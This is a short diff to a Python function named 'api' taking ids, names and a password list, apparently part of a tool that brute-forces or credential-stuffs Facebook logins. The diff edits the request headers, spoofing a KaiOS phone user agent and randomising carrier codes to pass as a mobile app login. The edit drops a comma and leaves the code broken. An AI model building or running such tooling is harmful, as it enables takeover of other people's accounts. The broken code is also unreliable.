@@ -527,9 +527,7 @@ def api(ids,names,passlist):
                                         "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                 head = {
                                         'content-type':'application/x-www-form-urlencoded',
-                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
-                                        'sec-fetch-user': '?1',
-                                        'upgrade-insecure-requests': '1',
+                                        'x-fb-sim-hni':str(random.randint(2e4,4e4))              
                                         'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
                                         'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                         'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
